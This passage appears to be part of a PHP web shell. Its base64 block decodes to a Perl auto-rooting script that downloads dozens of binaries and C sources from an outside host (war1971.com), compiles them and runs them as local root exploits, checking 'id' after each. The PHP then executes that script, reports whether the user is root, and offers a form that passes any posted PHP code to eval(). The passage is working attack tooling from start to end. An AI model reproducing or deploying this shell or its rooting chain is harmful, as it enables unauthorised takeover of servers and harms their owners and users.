Ow0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9ydW4y
Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IHJ1bjIiKTsgDQpzeXN0ZW0oIi4vcnVuMiIpOyANCnN5
c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7
DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzIwMDkt
MSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAyMDA5LTEiKTsgDQpzeXN0ZW0oIi4vMjAwOS0xIik7
IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwr
Y1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2Mv
ZGVybGUuYyIpOyANCnN5c3RlbSgiZ2NjIGRlcmxlLmMgLW8gZGVybGUiKTsgIA0Kc3lzdGVtKCJj
aG1vZCA3NzcgZGVybGUiKTsgDQpzeXN0ZW0oIi4vZGVybGUiKTsgDQpzeXN0ZW0oImlkIik7IA0K
cHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0
IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8zLmMiKTsgDQpzeXN0ZW0oImdj
YyAzLmMgLW8gMyIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAzIik7IA0Kc3lzdGVtKCIuLzMiKTsg
DQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtj
XG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8z
YSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDNhIik7IA0Kc3lzdGVtKCIuLzNhIik7IA0Kc3lzdGVt
KCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5
c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNC5jIik7IA0K
c3lzdGVtKCJnY2MgNC5jIC1vIDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgNCIpOyANCnN5c3Rl
bSgiLi80Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3
aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT
L2ZpbGUvY2MvNGEiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyA0YSIpOyANCnN5c3RlbSgiLi80YSIp
OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs
K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j
Yy9jeC5jIik7IA0Kc3lzdGVtKCJnY2MgY3guYyAtbyBjeCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3
NyBjeCIpOyANCnN5c3RlbSgiLi9jeCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy
IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx
OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jeHguYyIpOyANCnN5c3RlbSgiZ2NjIGN4eC5jLSBv
IGN4eCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBjeHgiKTsgDQpzeXN0ZW0oIi4vY3h4Iik7IA0K
c3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xu
IjsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4
cGxvaXQyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdDIiKTsgDQpzeXN0ZW0oIi4vZXhw
bG9pdDIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdp
dGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBydW4gaHR0cDovL3dhcjE5NzEuY29tL0NNU19G
SUxFUy9maWxlL2NjL3J1biIpOyANCnN5c3RlbSgiY2htb2QgNzc3IHJ1biIpOyANCnN5c3RlbSgi
Li9ydW4iKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdp
dGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT
L2ZpbGUvY2MvcnVuLnNoIik7ICANCnN5c3RlbSgiY2htb2QgNzc3IHJ1bi5zaCIpOyANCnN5c3Rl
bSgiLi9ydW4uc2giKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag
eHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf
RklMRVMvZmlsZS9jYy8yOS5jIik7IA0Kc3lzdGVtKCJnY2MgMjkuYyAtbyAyOSIpOyAgDQpzeXN0
ZW0oImNobW9kIDc3NyAyOSIpOyANCnN5c3RlbSgiLi8yOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpw
cmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oImh0dHA6
Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8zMCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3
NyAzMCIpOyANCnN5c3RlbSgiLi8zMCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy
IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5
NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzIwMDkiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAw
OSIpOyANCnN5c3RlbSgiLi8yMDA5Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIg
cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3
MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvaXNrb3JwaXR4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3
IGlza29ycGl0eCIpOyANCnN5c3RlbSgiLi9pc2tvcnBpdHgiKTsgDQpzeXN0ZW0oImlkIik7IA0K
cHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0
IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jIik7ICANCnN5c3RlbSgiY2ht
b2QgNzc3IGMiKTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYg
dSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dh
cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2N4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGN4
Iik7IA0Kc3lzdGVtKCIuL2N4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAw
dCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5j
b20vQ01TX0ZJTEVTL2ZpbGUvY2MvZGVybGUyIik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGRlcmxl
MiIpOyANCnN5c3RlbSgiLi9kZXJsZTIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUg
ciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx
OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9kZXJsZSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBk
ZXJsZSIpOyANCnN5c3RlbSgiLi9kZXJsZSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYg
dSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dh
cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzZ4LmMiKTsgIA0Kc3lzdGVtKCJnY2MgNnguYyAt
byA2eGEiKTsgDQpzeXN0ZW0oIi4vNnhhIik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1
IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2Fy
MTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNngiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgNngi
KTsgDQpzeXN0ZW0oIi4vNngiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0
IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNv
bS9DTVNfRklMRVMvZmlsZS9jYy82YiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA2YiIpOyANCnN5
c3RlbSgiLi82YiIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4
cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19G
SUxFUy9maWxlL2NjLzZ4eCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA2eHgiKTsgDQpzeXN0ZW0o
Ii4vNnh4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3
aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT
L2ZpbGUvY2MvMjc3MDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjc3MDQiKTsgDQpzeXN0ZW0o
Ii4vMjc3MDQiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBs
IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklM
RVMvZmlsZS9jYy9kZXJsZTIuYyIpOyANCnN5c3RlbSgiZ2NjIGRlcmxlMi5jIC1vIGRlcmxlMiIp
OyAgDQpzeXN0ZW0oImNobW9kIDc3NyBkZXJsZTIiKTsgDQpzeXN0ZW0oIi4vZGVybGUyIik7IA0K
c3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xu
IjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZGVy
bGUyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZGVybGUyIik7IA0Kc3lzdGVtKCIuL2RlcmxlMiIp
OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs
K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j
Yy8yOC5jIik7IA0Kc3lzdGVtKCJnY2MgMjguYyAtbyAyOCIpOyANCnN5c3RlbSgiY2htb2QgNzc3
IDI4Iik7IA0Kc3lzdGVtKCIuLzI4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yOCIp
OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs
K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j
Yy8yNy5jIik7IA0Kc3lzdGVtKCJnY2MgMjcuYyAtbyAyNyIpOyANCnN5c3RlbSgiY2htb2QgNzc3
IDI3Iik7IA0Kc3lzdGVtKCIuLzI3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yNyIp
OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs
K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j
Yy9jLmMiKTsgDQpzeXN0ZW0oImdjYyBjLmMgLW8gYyIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGMi
KTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vYyIpOyANCnN5
c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7
IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jMi5j
Iik7IA0Kc3lzdGVtKCJnY2MgYzIuYyAtbyBjMiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGMyIik7
IA0Kc3lzdGVtKCIuL2MyIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9jMiIpOyANCnN5
c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7
IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8wNSIp
OyANCnN5c3RlbSgiY2htb2QgNzc3IDA1Iik7IA0Kc3lzdGVtKCIuLzA1Iik7IA0Kc3lzdGVtKCJp
ZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsgDQpzeXN0
ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2lza28iKTsgDQpz
eXN0ZW0oImNobW9kIDc3NyBpc2tvIik7IA0Kc3lzdGVtKCIuL2lza28iKTsgDQpzeXN0ZW0oImlk
Iik7DQpzeXN0ZW0oIi4vaXNrbyIpOyANCnN5c3RlbSgiaXNrbyIpOw0KcHJpbnQgIklmIHUgciBy
MDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3
MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMTgiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyAxOCIpOyAN
CnN5c3RlbSgiLi8xOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vMTgiKTsgDQpzeXN0
ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyAN
CnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNyIpOyAN
CnN5c3RlbSgiY2htb2QgNzc3IDciKTsgDQpzeXN0ZW0oIi4vNyIpOyANCnN5c3RlbSgiaWQiKTsg
DQpzeXN0ZW0oIi4vNyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3Rv
cCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9D
TVNfRklMRVMvZmlsZS9jYy83LTIiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyA3LTIiKTsgDQpzeXN0
ZW0oIi4vNy0yIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi83LTIiKTsgDQpzeXN0ZW0o
ImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5
c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOCIpOyANCnN5
c3RlbSgiY2htb2QgNzc3IDgiKTsgDQpzeXN0ZW0oIi4vOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpz
eXN0ZW0oIi4vOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4
cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf
RklMRVMvZmlsZS9jYy84YSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDhhIik7IA0Kc3lzdGVtKCIu
LzhhIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi84YSIpOyANCnN5c3RlbSgiaWQiKTsg
DQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3
Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy84YmIiKTsgDQpzeXN0ZW0o
ImNobW9kIDc3NyA4YmIiKTsgDQpzeXN0ZW0oIi4vOGJiIik7IA0Kc3lzdGVtKCJpZCIpOyANCnBy
aW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsgDQpzeXN0ZW0oIndnZXQg
aHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzhjYyIpOyANCnN5c3RlbSgiY2ht
b2QgNzc3IDhjYyIpOyANCnN5c3RlbSgiLi84Y2MiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQg
IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRw
Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOHgiKTsgDQpzeXN0ZW0oImNobW9kIDc3
NyA4eCIpOyANCnN5c3RlbSgiLi84eCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vOHgi
KTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3Ry
bCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUv
Y2MvOSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDkiKTsgDQpzeXN0ZW0oIi4vOSIpOyANCnN5c3Rl
bSgiaWQiKTsgDQpzeXN0ZW0oIi4vOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy
IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx
OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9rcmFkMiIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGty
YWQyIik7IA0Kc3lzdGVtKCIuL2tyYWQyIik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9r
cmFkMiAtdCAxIC1wIDIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2tyYWQyIC10IDEg
LXAgMyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZDIgLXQgMSAtcCA0Iik7IA0K
c3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkMiAtdCAxIC1wIDUiKTsgDQpzeXN0ZW0oImlk
Iik7IA0Kc3lzdGVtKCIuL2tyYWQyIC10IDEgLXAgNiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0
ZW0oIi4va3JhZDIgLXQgMSAtcCA3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFk
MiAtdCAxIC1wIDgiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag
eHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01T
X0ZJTEVTL2ZpbGUvY2Mva3JhZCIpOyANCnN5c3RlbSgiY2htb2QgNzc3IGtyYWQiKTsgDQpzeXN0
ZW0oIi4va3JhZCIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZCAtdCAxIC1wIDIi
KTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2tyYWQgLXQgMSAtcCAzIik7IA0Kc3lzdGVt
KCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkIC10IDEgLXAgNCIpOyANCnN5c3RlbSgiaWQiKTsgDQpz
eXN0ZW0oIi4va3JhZCAtdCAxIC1wIDUiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2ty
YWQgLXQgMSAtcCA2Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rcmFkIC10IDEgLXAg
NyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4va3JhZCAtdCAxIC1wIDgiKTsgDQpzeXN0
ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmls
ZS9jYy9rLXJhZDMiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyBrLXJhZDMiKTsgDQpzeXN0ZW0oIi4v
ay1yYWQzIC10IDEgLXAgMiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10
IDEgLXAgMyIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNCIp
OyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNSIpOyANCnN5c3Rl
bSgiaWQiKTsgDQpzeXN0ZW0oIi4vay1yYWQzIC10IDEgLXAgNiIpOyANCnN5c3RlbSgiaWQiKTsg
DQpzeXN0ZW0oIi4vay1yYWQzIC10LXAgMiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4v
ay1yYWQzIC10IC1wIDIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuL2stcmFkMyAtYSAt
cCA3Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi9rLXJhZDMgLWEgLXAgNyIpOyANCnN5
c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7
IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8yNjgi
KTsgDQpzeXN0ZW0oImNobW9kIDc3NyAyNjgiKTsgDQpzeXN0ZW0oIi4vMjY4Iik7IA0KcHJpbnQg
IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRw
Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMjAwOCIpOyANCnN5c3RlbSgiY2htb2Qg
Nzc3IDIwMDgiKTsgDQpzeXN0ZW0oIi4vMjAwOCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAi
SWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7ICANCnN5c3RlbSgid2dldCBodHRw
Oi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMjAwOXguYyIpOyANCnN5c3RlbSgiZ2Nj
IDIwMDl4LmMgLW8gMjAwOXgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAwOXgiKTsgDQpzeXN0
ZW0oIi4vMjAwOXgiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag
eHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf
RklMRVMvZmlsZS9jYy8yMDA5eHgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAwOXh4Iik7IA0K
c3lzdGVtKCIuLzIwMDl4eCIpOyANCnN5c3RlbSgiaWQiKTsNCnN5c3RlbSgiaWQiKTsgDQpwcmlu
dCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0
dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8yLjYuOS01NS0yMDA3LXBydjgiKTsg
DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS01NS0yMDA3LXBydjgiKTsgDQpzeXN0ZW0oIi4vMi42
LjktNTUtMjAwNy1wcnY4Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgiLi8yLjYuOS01NS0y
MDA3LXBydjgiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCIuLzIuNi45LTU1LTIwMDctcHJ2
OCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBj
dHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmls
ZS9jYy8xOCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAxOCIpOyANCnN5c3RlbSgiLi8xOCIpOyAN
CnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxF
Uy9maWxlL2NjLzgiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgOCIpOyANCnN5c3RlbSgiLi84Iik7
IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJ
TEVTL2ZpbGUvY2MvZHoiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZHoiKTsgDQpzeXN0ZW0oIi4v
ZHoiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9D
TVNfRklMRVMvZmlsZS9jYy94ODYiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgeDg2Iik7IA0Kc3lz
dGVtKCIuL3g4NiIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5
NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2xvbCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBsb2wi
KTsgDQpzeXN0ZW0oIi4vbG9sIik7IA0Kc3lzdGVtKCJpZCIpOyANCn0=";

     $fd = fopen("r00t.pl","w");

            if ($fd != FALSE)
            {
                fwrite($fd,base64_decode($r00t));
                $out = exec_all("perl r00t.pl;");
            	if ($out != "")
            	{
			$cmd_out = exec_all("whoami");
			if ($cmd_out != "")
			{
				if (strpos($cmd_out == 'root') !== false)
					echo "<p class='alert_green'>You are ".trim(exec_all("whoami"))."</p>";
				else
					echo "<p class='alert_red'>You are ".trim(exec_all("whoami"))."</p>";
			}
			else
			{
				echo "<p class='alert_red'>Rooting Failed</p>";
			}
            	}
	    }
            else
            {
                echo "<p class='alert_red'>Permission Denied</p>";
            }
    ?>
    <?php
}

// PHP evaluate

else if(isset($_GET['eval']))
{
    ?>
    
    <form method="POST">
    <textarea name="code" class="cmd" cols="100" rows="20"><?php
    // If the comand was sent
    if(isset($_POST['code'])
        && $_POST['code']
    )
    {
        // Filter Some Chars we dont need

        $code = str_replace("<?php","",$_POST['code']);
        $code = str_replace("<?","",$code);
        $code = str_replace("?>","",$code);

        // Evaluate PHP CoDE!

        echo htmlspecialchars(eval($code));
    }
    else
    {
